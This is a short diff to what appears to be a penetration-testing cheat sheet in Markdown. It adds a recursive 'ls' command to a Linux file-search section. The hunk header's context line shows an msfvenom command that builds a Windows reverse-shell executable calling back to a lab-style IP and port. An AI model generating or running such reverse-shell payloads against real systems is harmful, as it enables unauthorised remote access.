@@ -294,6 +294,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > Reve
 - [enum4linux](https://www.kali.org/tools/enum4linux/)
 ### Linux Search 
 ```bash
+# List directories like tree /F /A
+ls -la -R
 
 # Search for file types
 find . -type f -iname '*db*' -print
